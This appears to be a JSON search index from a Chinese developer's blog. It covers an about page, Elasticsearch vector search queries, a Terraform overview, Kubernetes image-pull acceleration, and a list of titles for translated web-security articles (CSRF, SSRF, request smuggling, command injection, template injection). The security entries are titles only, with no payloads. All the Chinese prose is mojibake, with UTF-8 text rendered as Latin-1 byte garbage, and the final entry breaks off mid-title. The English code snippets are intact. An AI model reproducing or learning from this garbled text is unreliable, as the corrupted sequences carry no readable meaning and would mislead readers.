[{"categories":null,"content":"æœ¬äººå…·å¤‡å¤šå¹´é¡¹ç›®ç»éªŒï¼Œç›®å‰è´Ÿè´£åç«¯å¼€å‘ä¸ç³»ç»Ÿæ¶æ„ï¼Œåæ ‡æ­å·ã€‚æˆ‘çš„åšå®¢å°†ä¼šæŒç»­åˆ†äº«æœ‰å…³ Node.jsï¼ŒPythonï¼ŒGolangï¼Œç¼–ç¨‹ï¼Œåº”ç”¨å¼€å‘ï¼Œæ¶ˆæ¯é˜Ÿåˆ—ï¼Œä¸­é—´ä»¶ï¼Œæ•°æ®åº“ï¼Œå®¹å™¨åŒ–ï¼Œäº‘åŸç”Ÿï¼Œå¤§æ•°æ®ï¼Œå›¾åƒå¤„ç†ï¼Œæœºå™¨å­¦ä¹ ï¼Œäººå·¥æ™ºèƒ½ï¼Œæ¶æ„ï¼Œç¨‹åºå‘˜æˆé•¿ï¼Œç­‰ç­‰ä¸€ç³»åˆ—æ–‡ç« ã€‚ ","date":"2023-02-14","objectID":"/about/:0:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"â­ æˆ‘æ˜¯å‡Œè™š ğŸ§‘â€ğŸ’» ä¸€åè½¯ä»¶å¼€å‘å·¥ç¨‹å¸ˆä¸ç³»ç»Ÿæ¶æ„å¸ˆã€‚ ğŸŒ æˆ‘æ›¾ç»ä¸»å¯¼çš„é¡¹ç›®æœåŠ¡äºæ•°ç™¾ä¸‡ç”¨æˆ·ï¼Œåº”å¯¹æ—¥å‡åƒä¸‡çº§æµé‡ï¼Œç®¡ç†æ•°åäº¿çº§åˆ«çš„å›¾ç‰‡ã€‚ ğŸ”¥ ç›®å‰æ­£åœ¨äº’è”ç½‘åŒ»ç–—å™¨æ¢°ä¸åŒ»ç–—æœåŠ¡é¢†åŸŸçš„å…¬å¸æ·±è€•ï¼Œå¸Œæœ›ç”¨æŠ€æœ¯é€ ç¦å¤§ä¼—ã€‚ â¤ï¸ çƒ­çˆ± Node.js å’Œ Golang, æ“…é•¿ Elasticsearch å’Œ Kubernetes. ğŸ  ç›®å‰å·¥ä½œå¹¶ç”Ÿæ´»åœ¨æ­å·ã€‚ ğŸ’¬ æœ‰ä»»ä½•é—®é¢˜éƒ½å¯ä»¥ä¸æˆ‘å¾®ä¿¡ rifewang äº¤æµã€‚ ","date":"2023-02-14","objectID":"/about/:1:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":null,"content":"ğŸ›  æˆ‘çš„æŠ€æœ¯æ ˆ ğŸ’» ğŸ”§ â˜ï¸ ğŸŒ ğŸ›¢ æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ï¼Œå¹¶ä¸æˆ‘äº¤æµï¼š ","date":"2023-02-14","objectID":"/about/:2:0","tags":null,"title":"å…³äºæˆ‘","uri":"/about/"},{"categories":["Elasticsearch"],"content":"Elasticsearch å‘é‡æœç´¢ æœ¬æ–‡å°†ä¼šä»‹ç» Elasticsearch å‘é‡æœç´¢çš„ä¸¤ç§æ–¹å¼ã€‚ ","date":"2022-04-15","objectID":"/es-vector-search/:0:0","tags":["Elasticsearch"],"title":"Elasticsearch å‘é‡æœç´¢","uri":"/es-vector-search/"},{"categories":["Elasticsearch"],"content":"å‘é‡æœç´¢ æåˆ°å‘é‡æœç´¢ï¼Œæˆ‘æƒ³ä½ ä¸€å®šæƒ³çŸ¥é“ï¼š å‘é‡æœç´¢æ˜¯ä»€ä¹ˆï¼Ÿ å‘é‡æœç´¢çš„åº”ç”¨åœºæ™¯æœ‰å“ªäº›ï¼Ÿ å‘é‡æœç´¢ä¸å…¨æ–‡æœç´¢æœ‰ä½•ä¸åŒï¼Ÿ ES çš„å…¨æ–‡æœç´¢ç®€è€Œè¨€ä¹‹å°±æ˜¯å°†æ–‡æœ¬è¿›è¡Œåˆ†è¯ï¼Œç„¶ååŸºäºè¯é€šè¿‡ BM25 ç®—æ³•è®¡ç®—ç›¸å…³æ€§å¾—åˆ†ï¼Œä»è€Œæ‰¾åˆ°ä¸æœç´¢è¯­å¥ç›¸ä¼¼çš„æ–‡æœ¬ï¼Œå…¶æœ¬è´¨ä¸Šæ˜¯ä¸€ç§ term-basedï¼ˆåŸºäºè¯ï¼‰çš„æœç´¢ã€‚ å…¨æ–‡æœç´¢çš„å®é™…ä½¿ç”¨å·²ç»éå¸¸å¹¿æ³›ï¼Œæ ¸å¿ƒæŠ€æœ¯ä¹Ÿéå¸¸æˆç†Ÿã€‚ä½†æ˜¯ï¼Œé™¤äº†æ–‡æœ¬å†…å®¹ä¹‹å¤–ï¼Œç°å®ç”Ÿæ´»ä¸­è¿˜æœ‰éå¸¸å¤šå…¶å®ƒçš„æ•°æ®å½¢å¼ï¼Œä¾‹å¦‚ï¼šå›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ç­‰ï¼Œæˆ‘ä»¬èƒ½ä¸èƒ½ä¹Ÿå¯¹è¿™äº›æ•°æ®è¿›è¡Œæœç´¢å‘¢ï¼Ÿ ç­”æ¡ˆæ˜¯ Yes ! éšç€æœºå™¨å­¦ä¹ å’Œäººå·¥æ™ºèƒ½ç­‰æŠ€æœ¯çš„å‘å±•ï¼Œä¸‡ç‰©çš†å¯ Embeddingã€‚æ¢å¥è¯è¯´å°±æ˜¯ï¼Œæˆ‘ä»¬å¯ä»¥å¯¹æ–‡æœ¬ã€å›¾ç‰‡ã€éŸ³é¢‘ã€è§†é¢‘ç­‰ç­‰ä¸€åˆ‡æ•°æ®é€šè¿‡ Embedding ç›¸å…³æŠ€æœ¯å°†å…¶è½¬æ¢æˆç‰¹å¾å‘é‡ï¼Œè€Œä¸€æ—¦å‘é‡æœ‰äº†ï¼Œå‘é‡æœç´¢çš„éœ€æ±‚éšä¹‹ä¹Ÿè¶Šå‘å¼ºçƒˆï¼Œå‘é‡æœç´¢çš„åº”ç”¨åœºæ™¯ä¹Ÿå˜å¾—ä¸€æœ›æ— é™…ã€å……æ»¡æƒ³è±¡åŠ›ã€‚ ","date":"2022-04-15","objectID":"/es-vector-search/:1:0","tags":["Elasticsearch"],"title":"Elasticsearch å‘é‡æœç´¢","uri":"/es-vector-search/"},{"categories":["Elasticsearch"],"content":"ES å‘é‡æœç´¢è¯´æ˜ ES å‘é‡æœç´¢ç›®å‰æœ‰ä¸¤ç§æ–¹å¼: script_score _knn_search ","date":"2022-04-15","objectID":"/es-vector-search/:2:0","tags":["Elasticsearch"],"title":"Elasticsearch å‘é‡æœç´¢","uri":"/es-vector-search/"},{"categories":["Elasticsearch"],"content":"script_score ç²¾ç¡®æœç´¢ ES 7.6 ç‰ˆæœ¬å¯¹æ–°å¢çš„å­—æ®µç±»å‹ dense_vector ç¡®è®¤äº†ç¨³å®šæ€§ä¿è¯ï¼Œè¿™ä¸ªå­—æ®µç±»å‹å°±æ˜¯ç”¨æ¥è¡¨ç¤ºå‘é‡æ•°æ®çš„ã€‚ æ•°æ®å»ºæ¨¡ç¤ºä¾‹ï¼š PUT my-index { \"mappings\": { \"properties\": { \"my_vector\": { \"type\": \"dense_vector\", \"dims\": 128 }, \"my_text\" : { \"type\" : \"keyword\" } } } } å¦‚ä¸Šå›¾æ‰€ç¤ºï¼Œæˆ‘ä»¬åœ¨ç´¢å¼•ä¸­å»ºç«‹äº†ä¸€ä¸ª dims ç»´åº¦ä¸º 128 çš„å‘é‡æ•°æ®å­—æ®µã€‚ script_score æœç´¢ç¤ºä¾‹ï¼š { \"script_score\": { \"query\": {\"match_all\": {}}, \"script\": { \"source\": \"cosineSimilarity(params.query_vector, 'my_vector') + 1.0\", \"params\": {\"query_vector\": query_vector} } } } ä¸Šå›¾æ‰€ç¤ºçš„å«ä¹‰æ˜¯ä½¿ç”¨ ES 7.3 ç‰ˆæœ¬ä¹‹åå†…ç½®çš„ cosineSimilarity ä½™å¼¦ç›¸ä¼¼åº¦å‡½æ•°è®¡ç®—å‘é‡ä¹‹é—´çš„ç›¸ä¼¼åº¦å¾—åˆ†ã€‚ éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œscript_score è¿™ç§æœç´¢æ–¹å¼æ˜¯å…ˆæ‰§è¡Œ query ï¼Œç„¶åå¯¹åŒ¹é…çš„æ–‡æ¡£å†è¿›è¡Œå‘é‡ç›¸ä¼¼åº¦ç®—åˆ†ï¼Œå…¶éšå«çš„å«ä¹‰æ˜¯ï¼š æ•°æ®å»ºæ¨¡æ—¶å‘é‡å­—æ®µå¯ä»¥ä¸å…¶å®ƒå­—æ®µç±»å‹ä¸€èµ·ä½¿ç”¨ï¼Œä¹Ÿå°±æ˜¯æ”¯æŒæ··åˆæŸ¥è¯¢ï¼ˆå…ˆè¿›è¡Œå…¨æ–‡æœç´¢ï¼Œå†åŸºäºæœç´¢ç»“æœè¿›è¡Œå‘é‡æœç´¢ï¼‰ã€‚ script_score æ˜¯ä¸€ç§æš´åŠ›è®¡ç®—ï¼Œæ•°æ®é›†è¶Šå¤§ï¼Œæ€§èƒ½æŸè€—å°±è¶Šå¤§ã€‚ ","date":"2022-04-15","objectID":"/es-vector-search/:2:1","tags":["Elasticsearch"],"title":"Elasticsearch å‘é‡æœç´¢","uri":"/es-vector-search/"},{"categories":["Elasticsearch"],"content":"_knn_search æœç´¢ ç”±äº script_score çš„æ€§èƒ½é—®é¢˜ï¼ŒES åœ¨ 8.0 ç‰ˆæœ¬å¼•å…¥äº†ä¸€ç§æ–°çš„å‘é‡æœç´¢æ–¹æ³• _knn_searchï¼ˆç›®å‰å¤„äºè¯•éªŒæ€§åŠŸèƒ½ï¼‰ã€‚ æ‰€è°“çš„ _knn_search å…¶å®å°±æ˜¯ä¸€ç§ approximate nearest neighbor search (ANN) å³ è¿‘ä¼¼æœ€è¿‘é‚»æœç´¢ã€‚è¿™ç§æœç´¢æ–¹å¼åœ¨ç‰ºç‰²ä¸€å®šå‡†ç¡®æ€§çš„æƒ…å†µä¸‹ä¼˜å…ˆè¿½æ±‚æœç´¢æ€§èƒ½ã€‚ ä¸ºäº†ä½¿ç”¨ _knn_search æœç´¢ï¼Œåœ¨æ•°æ®å»ºæ¨¡æ—¶æœ‰æ‰€ä¸åŒã€‚ ç¤ºä¾‹ï¼š PUT my-index-knn { \"mappings\": { \"properties\": { \"my_vector\": { \"type\": \"dense_vector\", \"dims\": 128, \"index\": true, \"similarity\": \"dot_product\" } } } } å¦‚ä¸Šæ‰€ç¤ºï¼Œæˆ‘ä»¬å¿…é¡»é¢å¤–æŒ‡å®šï¼š index ä¸º true ã€‚ similarity æŒ‡å®šå‘é‡ç›¸ä¼¼åº¦ç®—æ³•ï¼Œå¯ä»¥æ˜¯ l2_norm ã€dot_productã€cosine å…¶ä¸­ä¹‹ä¸€ã€‚ é¢å¤–æŒ‡å®š index ä¸º true æ˜¯å› ä¸ºï¼Œä¸ºäº†å®ç° _knn_searchï¼ŒES å¿…é¡»åœ¨åº•å±‚æ„å»ºä¸€ä¸ªæ–°çš„æ•°æ®ç»“æ„ï¼ˆç›®å‰ä½¿ç”¨çš„æ˜¯ HNSW graph ï¼‰ã€‚ _knn_search æœç´¢ç¤ºä¾‹ï¼š GET my-index-knn/_knn_search { \"knn\": { \"field\": \"my_vector\", \"query_vector\": [0.3, 0.1, 1.2, ...], \"k\": 10, \"num_candidates\": 100 }, \"_source\": [\"name\", \"date\"] } ä½¿ç”¨ _knn_search æœç´¢çš„ä¼˜ç‚¹å°±æ˜¯æœç´¢é€Ÿåº¦éå¸¸å¿«ï¼Œç¼ºç‚¹å°±æ˜¯ç²¾ç¡®åº¦ä¸æ˜¯ç™¾åˆ†ç™¾ï¼ŒåŒæ—¶æ— æ³•ä¸ Query DSL ä¸€èµ·ä½¿ç”¨ï¼Œå³æ— æ³•è¿›è¡Œæ··åˆæœç´¢ã€‚ ","date":"2022-04-15","objectID":"/es-vector-search/:2:2","tags":["Elasticsearch"],"title":"Elasticsearch å‘é‡æœç´¢","uri":"/es-vector-search/"},{"categories":["Elasticsearch"],"content":"å‚è€ƒæ–‡æ¡£ text-similarity-search-with-vectors-in-elasticsearch dense-vector knn-search introducing-approximate-nearest-neighbor-search-in-elasticsearch ","date":"2022-04-15","objectID":"/es-vector-search/:3:0","tags":["Elasticsearch"],"title":"Elasticsearch å‘é‡æœç´¢","uri":"/es-vector-search/"},{"categories":[],"content":"Terraform: åŸºç¡€è®¾æ–½å³ä»£ç  ","date":"2022-03-27","objectID":"/terraform-overview/:0:0","tags":["CICD"],"title":"Terraform: åŸºç¡€è®¾æ–½å³ä»£ç ","uri":"/terraform-overview/"},{"categories":[],"content":"é—®é¢˜ ç°å¦‚ä»Šæœ‰å¾ˆå¤š IT ç³»ç»Ÿçš„åŸºç¡€è®¾æ–½ç›´æ¥ä½¿ç”¨äº†äº‘å‚å•†æä¾›çš„æœåŠ¡ï¼Œå‡è®¾æˆ‘ä»¬éœ€è¦æ„å»ºä»¥ä¸‹åŸºç¡€è®¾æ–½ï¼š VPC ç½‘ç»œ è™šæ‹Ÿä¸»æœº è´Ÿè½½å‡è¡¡å™¨ æ•°æ®åº“ æ–‡ä»¶å­˜å‚¨ â€¦ é‚£ä¹ˆåœ¨å…¬æœ‰äº‘çš„ç¯å¢ƒä¸­ï¼Œæˆ‘ä»¬ä¸€èˆ¬æ€ä¹ˆåšï¼Ÿ åœ¨äº‘å‚å•†æä¾›çš„å‰ç«¯ç®¡ç†é¡µé¢ä¸Šæ‰‹åŠ¨æ“ä½œå—ï¼Ÿ è¿™ä¹Ÿå¤ªè´¹åŠ²äº†å§ï¼Œå°¤å…¶æ˜¯å½“åŸºç¡€è®¾æ–½è¶Šæ¥è¶Šå¤šã€è¶Šæ¥è¶Šå¤æ‚ã€ä»¥åŠè·¨å¤šä¸ªäº‘ç¯å¢ƒçš„æ—¶å€™ï¼Œè¿™äº›åŸºç¡€è®¾æ–½çš„é…ç½®å’Œç®¡ç†ä¾¿ä¼šç¢°åˆ°ä¸€ä¸ªå·¨å¤§çš„æŒ‘æˆ˜ã€‚ ","date":"2022-03-27","objectID":"/terraform-overview/:1:0","tags":["CICD"],"title":"Terraform: åŸºç¡€è®¾æ–½å³ä»£ç ","uri":"/terraform-overview/"},{"categories":[],"content":"Terraform ä¸ºäº†è§£å†³ä¸Šè¿°é—®é¢˜ï¼ŒTerrafrom åº”è¿è€Œç”Ÿã€‚ ä½¿ç”¨ Terraform ï¼Œæˆ‘ä»¬åªéœ€è¦ç¼–å†™ç®€å•çš„å£°æ˜å¼ä»£ç ï¼Œå½¢å¦‚ï¼š ... resource \"alicloud_db_instance\" \"instance\" { engine = \"MySQL\" engine_version = \"5.6\" instance_type = \"rds.mysql.s1.small\" instance_storage = \"10\" ... } ç„¶åæ‰§è¡Œå‡ ä¸ªç®€å•çš„ terraform å‘½ä»¤ä¾¿å¯ä»¥è½»æ¾åˆ›å»ºä¸€ä¸ªé˜¿é‡Œäº‘çš„æ•°æ®åº“å®ä¾‹ã€‚ è¿™å°±æ˜¯ Infrastructure as code åŸºç¡€è®¾æ–½å³ä»£ç ã€‚ä¹Ÿå°±æ˜¯é€šè¿‡ä»£ç è€Œä¸æ˜¯æ‰‹åŠ¨æµç¨‹æ¥ç®¡ç†å’Œé…ç½®åŸºç¡€è®¾æ–½ã€‚ æ­£å¦‚å…¶å®˜æ–¹æ–‡æ¡£æ‰€è¿°ï¼Œä¸æ‰‹åŠ¨ç®¡ç†åŸºç¡€è®¾æ–½ç›¸æ¯”ï¼Œä½¿ç”¨ Terraform æœ‰ä»¥ä¸‹å‡ ä¸ªä¼˜åŠ¿ï¼š Terraform å¯ä»¥è½»æ¾ç®¡ç†å¤šä¸ªäº‘å¹³å°ä¸Šçš„åŸºç¡€è®¾æ–½ã€‚ ä½¿ç”¨äººç±»å¯è¯»çš„å£°æ˜å¼çš„é…ç½®è¯­è¨€ï¼Œæœ‰åŠ©äºå¿«é€Ÿç¼–å†™åŸºç¡€è®¾æ–½ä»£ç ã€‚ Terraform çš„çŠ¶æ€å…è®¸æ‚¨åœ¨æ•´ä¸ªéƒ¨ç½²è¿‡ç¨‹ä¸­è·Ÿè¸ªèµ„æºæ›´æ”¹ã€‚ å¯ä»¥å¯¹è¿™äº›åŸºç¡€è®¾æ–½ä»£ç è¿›è¡Œç‰ˆæœ¬æ§åˆ¶ï¼Œä»è€Œå®‰å…¨åœ°è¿›è¡Œåä½œã€‚ ","date":"2022-03-27","objectID":"/terraform-overview/:2:0","tags":["CICD"],"title":"Terraform: åŸºç¡€è®¾æ–½å³ä»£ç ","uri":"/terraform-overview/"},{"categories":[],"content":"Provider \u0026 Module ä½ ä¹Ÿè®¸ä¼šæ„Ÿåˆ°å›°æƒ‘ï¼Œæˆ‘åªæ˜¯ç®€å•çš„åº”ç”¨äº†æ‰€å†™çš„å£°æ˜å¼ä»£ç ï¼Œæ€ä¹ˆå°±æ„å»ºå‡ºæ¥äº†åŸºç¡€è®¾æ–½ï¼Œè¿™ä¸­é—´å‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ å…¶å®ç®€è€Œè¨€ä¹‹å°±æ˜¯ terraform åœ¨æ‰§è¡Œçš„è¿‡ç¨‹ä¸­å†…éƒ¨è°ƒç”¨äº†åŸºç¡€è®¾æ–½å¹³å°æä¾›çš„ API ã€‚ æ¯ä¸ªåŸºç¡€è®¾æ–½å¹³å°éƒ½ä¼šæŠŠå¯¹è‡ªèº«èµ„æºçš„æ“ä½œç»Ÿä¸€å°è£…æ‰“åŒ…æˆä¸€ä¸ª provider ã€‚provider çš„æ¦‚å¿µå°±å¥½åƒæ˜¯ç¼–ç¨‹è¯­è¨€ä¸­çš„ä¸€ä¸ªä¾èµ–åº“ã€‚ åœ¨ terraform ä¸­å¼•ç”¨ provider ï¼š terraform { required_providers { alicloud = { source = \"aliyun/alicloud\" version = \"1.161.0\" } } } provider \"alicloud\" { # Configuration options } æˆ‘ä»¬åœ¨å†™ä»£ç çš„æ—¶å€™ç»å¸¸ä¼šæŠŠæŸäº›å¯é‡ç”¨çš„éƒ¨åˆ†å‰¥ç¦»å‡ºæ¥ä½œä¸ºä¸€ä¸ªæ¨¡å—ï¼Œè€Œåœ¨ terraform ä¸­ï¼Œå¯¹åŸºç¡€è®¾æ–½çš„ç®¡ç†ä¹Ÿæ˜¯å¦‚æ­¤ï¼Œæˆ‘ä»¬èƒ½å¤ŸæŠŠå¯é‡ç”¨çš„ terraform é…ç½®ç»„æˆ module æ¨¡å—ï¼Œæˆ‘ä»¬å³å¯ä»¥åœ¨æˆ‘ä»¬ local æœ¬åœ°è‡ªå·±ç¼–å†™æ¨¡å—ï¼Œä¹Ÿå¯ä»¥ç›´æ¥ä½¿ç”¨ç¬¬ä¸‰æ–¹ç»„ç»‡å¥½å¹¶ä¸”å…¬å¼€å‘å¸ƒçš„ remote æ¨¡å—ã€‚ ","date":"2022-03-27","objectID":"/terraform-overview/:2:1","tags":["CICD"],"title":"Terraform: åŸºç¡€è®¾æ–½å³ä»£ç ","uri":"/terraform-overview/"},{"categories":[],"content":"æœ€å æœ¬æ–‡åªæ˜¯æŠ›ç –å¼•ç‰ç½¢äº†ï¼Œæœ‰å…³ terraform çš„æ›´å¤šå†…å®¹è¿˜è¯·å‚è€ƒå®˜æ–¹æ–‡æ¡£åŠå…¶å®ƒèµ„æ–™ã€‚ ","date":"2022-03-27","objectID":"/terraform-overview/:3:0","tags":["CICD"],"title":"Terraform: åŸºç¡€è®¾æ–½å³ä»£ç ","uri":"/terraform-overview/"},{"categories":["Kubernetes"],"content":"åŠ é€Ÿ Kubernetes é•œåƒæ‹‰å– Kubernetes pod å¯åŠ¨æ—¶ä¼šæ‹‰å–ç”¨æˆ·æŒ‡å®šçš„é•œåƒï¼Œä¸€æ—¦è¿™ä¸ªè¿‡ç¨‹è€—æ—¶å¤ªä¹…å°±ä¼šå¯¼è‡´ pod é•¿æ—¶é—´å¤„äº pending çš„çŠ¶æ€ï¼Œä»è€Œæ— æ³•å¿«é€Ÿæä¾›æœåŠ¡ã€‚ é•œåƒæ‹‰å–çš„è¿‡ç¨‹å‚è€ƒä¸‹å›¾æ‰€ç¤ºï¼š Pod çš„ imagePullPolicy é•œåƒæ‹‰å–ç­–ç•¥æœ‰ä¸‰ç§ï¼š IfNotPresentï¼šåªæœ‰å½“é•œåƒåœ¨æœ¬åœ°ä¸å­˜åœ¨æ—¶æ‰ä¼šæ‹‰å–ã€‚ Alwaysï¼škubelet ä¼šå¯¹æ¯”é•œåƒçš„ digest ï¼Œå¦‚æœæœ¬åœ°å·²ç¼“å­˜åˆ™ç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜ï¼Œå¦åˆ™ä»é•œåƒä»“åº“ä¸­æ‹‰å–ã€‚ Neverï¼šåªä½¿ç”¨æœ¬åœ°é•œåƒï¼Œå¦‚æœä¸å­˜åœ¨åˆ™ç›´æ¥å¤±è´¥ã€‚ è¯´æ˜ï¼šæ¯ä¸ªé•œåƒçš„ digest ä¸€å®šå”¯ä¸€ï¼Œä½†æ˜¯ tag å¯ä»¥è¢«è¦†ç›–ã€‚ ä»é•œåƒæ‹‰å–çš„è¿‡ç¨‹æ¥çœ‹ï¼Œæˆ‘ä»¬å¯ä»¥ä»ä»¥ä¸‹ä¸‰ä¸ªæ–¹é¢æ¥åŠ é€Ÿé•œåƒæ‹‰å–ï¼š ç¼©å‡é•œåƒå¤§å°ï¼š ä½¿ç”¨è¾ƒå°çš„åŸºç¡€é•œåƒã€ç§»é™¤æ— ç”¨çš„ä¾èµ–ã€å‡å°‘é•œåƒ layer ã€ä½¿ç”¨å¤šé˜¶æ®µæ„å»ºç­‰ç­‰ã€‚ æ¨èä½¿ç”¨ docker-slim åŠ å¿«é•œåƒä»“åº“ä¸ k8s èŠ‚ç‚¹ä¹‹é—´çš„ç½‘ç»œä¼ è¾“é€Ÿåº¦ã€‚ ä¸»åŠ¨ç¼“å­˜é•œåƒï¼š Pre-pulled é¢„æ‹‰å–é•œåƒï¼Œä»¥ä¾¿åç»­ç›´æ¥ä½¿ç”¨æœ¬åœ°ç¼“å­˜ï¼Œæ¯”å¦‚å¯ä»¥ä½¿ç”¨ daemonset å®šæœŸåŒæ­¥ä»“åº“ä¸­çš„é•œåƒåˆ° k8s èŠ‚ç‚¹æœ¬åœ°ã€‚ ","date":"2022-03-13","objectID":"/speed-up-image-pull/:1:0","tags":["Kubernetes"],"title":"åŠ é€Ÿ Kubernetes é•œåƒæ‹‰å–","uri":"/speed-up-image-pull/"},{"categories":["Kubernetes"],"content":"é¢˜å¤–è¯ ","date":"2022-03-13","objectID":"/speed-up-image-pull/:2:0","tags":["Kubernetes"],"title":"åŠ é€Ÿ Kubernetes é•œåƒæ‹‰å–","uri":"/speed-up-image-pull/"},{"categories":["Kubernetes"],"content":"1ï¼šæœ¬åœ°é•œåƒç¼“å­˜å¤šä¹…ï¼Ÿæ˜¯å¦ä¼šé€ æˆç£ç›˜å ç”¨é—®é¢˜ï¼Ÿ æœ¬åœ°ç¼“å­˜çš„é•œåƒä¸€å®šä¼šå ç”¨èŠ‚ç‚¹çš„ç£ç›˜ç©ºé—´ï¼Œä¹Ÿå°±æ˜¯è¯´ç¼“å­˜çš„é•œåƒè¶Šå¤šï¼Œå ç”¨çš„ç£ç›˜ç©ºé—´è¶Šå¤§ï¼Œå¹¶ä¸”ç¼“å­˜çš„é•œåƒé»˜è®¤ä¸€ç›´å­˜åœ¨ï¼Œå¹¶æ²¡æœ‰ TTL æœºåˆ¶ï¼ˆæ¯”å¦‚è¯´å¤šé•¿æ—¶é—´ä»¥åè‡ªåŠ¨è¿‡æœŸåˆ é™¤ï¼‰ã€‚ ä½†æ˜¯ï¼Œk8s çš„ GC æœºåˆ¶ä¼šè‡ªåŠ¨æ¸…ç†æ‰é•œåƒã€‚å½“èŠ‚ç‚¹çš„ç£ç›˜ä½¿ç”¨ç‡è¾¾åˆ° HighThresholdPercent é«˜ç™¾åˆ†æ¯”é˜ˆå€¼æ—¶ï¼ˆé»˜è®¤ 85% ï¼‰ä¼šè§¦å‘åƒåœ¾å›æ”¶ï¼Œæ­¤æ—¶ kubelet ä¼šæ ¹æ®ä½¿ç”¨æƒ…å†µåˆ é™¤æœ€æ—§çš„ä¸å†ä½¿ç”¨çš„é•œåƒï¼Œç›´åˆ°ç£ç›˜ä½¿ç”¨ç‡è¾¾åˆ° LowThresholdPercentï¼ˆé»˜è®¤ 80% ï¼‰ã€‚ ","date":"2022-03-13","objectID":"/speed-up-image-pull/:2:1","tags":["Kubernetes"],"title":"åŠ é€Ÿ Kubernetes é•œåƒæ‹‰å–","uri":"/speed-up-image-pull/"},{"categories":["Kubernetes"],"content":"2ï¼šé•œåƒ layer å±‚æ•°çœŸçš„è¶Šå°‘è¶Šå¥½å—ï¼Ÿ æˆ‘ä»¬ç»å¸¸ä¼šçœ‹åˆ°ä¸€äº›æ–‡ç« è¯´åœ¨ Dockerfile é‡Œä½¿ç”¨æ›´å°‘çš„ RUN å‘½ä»¤ä¹‹ç±»çš„å‡å°‘é•œåƒçš„ layer å±‚æ•°ç„¶åç¼©å‡é•œåƒçš„å¤§å°ï¼Œlayer è¶Šå°‘é•œåƒè¶Šå°è¿™ç¡®å®æ²¡é”™ï¼Œä½†æ˜¯æŸäº›åœºæ™¯ä¸‹å¾—ä¸å¿å¤±ã€‚é¦–å…ˆï¼Œå¦‚æœä½ çš„ RUN å‘½ä»¤å¾ˆå¤§ï¼Œä¸€æ—¦ä½ ä¿®æ”¹äº†å…¶ä¸­æŸä¸€ä¸ªå°çš„éƒ¨åˆ†ï¼Œé‚£ä¹ˆè¿™ä¸ª layer åœ¨æ„å»ºçš„æ—¶å€™å°±åªèƒ½é‡æ–°å†æ¥ï¼Œæ— æ³•ä½¿ç”¨ä»»ä½•ç¼“å­˜ï¼›å…¶æ¬¡ï¼Œé•œåƒçš„ layer åœ¨ä¸Šä¼ å’Œä¸‹è½½çš„è¿‡ç¨‹ä¸­æ˜¯å¯ä»¥å¹¶å‘çš„ï¼Œè€Œå•ç‹¬ä¸€ä¸ªå¤§çš„å±‚æ— æ³•è¿›è¡Œå¹¶å‘ä¼ è¾“ã€‚ ","date":"2022-03-13","objectID":"/speed-up-image-pull/:2:2","tags":["Kubernetes"],"title":"åŠ é€Ÿ Kubernetes é•œåƒæ‹‰å–","uri":"/speed-up-image-pull/"},{"categories":["web security"],"content":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","date":"2021-08-12","objectID":"/web-security/","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"Cross-site request forgery (CSRF) CSRF XSS vs CSRF CSRF tokens SameSite cookies ","date":"2021-08-12","objectID":"/web-security/:1:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"Clickjacking (UI redressing) Clickjacking (UI redressing) ","date":"2021-08-12","objectID":"/web-security/:2:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"Cross-origin resource sharing (CORS) CORS Same-origin policy (SOP) Access-control-allow-origin ","date":"2021-08-12","objectID":"/web-security/:3:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"Server-side request forgery (SSRF) Server-side request forgery (SSRF) Blind SSRF vulnerabilities ","date":"2021-08-12","objectID":"/web-security/:4:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"HTTP request smuggling HTTP request smuggling Finding HTTP request smuggling vulnerabilities Exploiting HTTP request smuggling vulnerabilities ","date":"2021-08-12","objectID":"/web-security/:5:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"OS command injectionn OS command injection ","date":"2021-08-12","objectID":"/web-security/:6:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"Server-side template injection Server-side template injection Exploiting server-side template injection vulnerabilities ","date":"2021-08-12","objectID":"/web-security/:7:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"Directory traversal Directory traversal ","date":"2021-08-12","objectID":"/web-security/:8:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"DOM-based vulnerabilities DOM-based vulnerabilities DOM clobbering ","date":"2021-08-12","objectID":"/web-security/:9:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"HTTP Host header attacks HTTP Host header attacks Exploiting HTTP Host header vulnerabilities Password reset poisoning ","date":"2021-08-12","objectID":"/web-security/:10:0","tags":[],"title":"web å®‰å…¨ç³»åˆ—æ–‡ç« ã€è¯‘æ–‡ã€‘","uri":"/web-security/"},{"categories":["web security"],"content":"web å®‰å…¨ä¹‹ Server-side template injection","date":"2021-03-10","objectID":"/translation/web-security/server-side-template-injection/server-side-template-injection/","tags":[],"title":"web å®‰å…¨ä¹‹ Server-side template 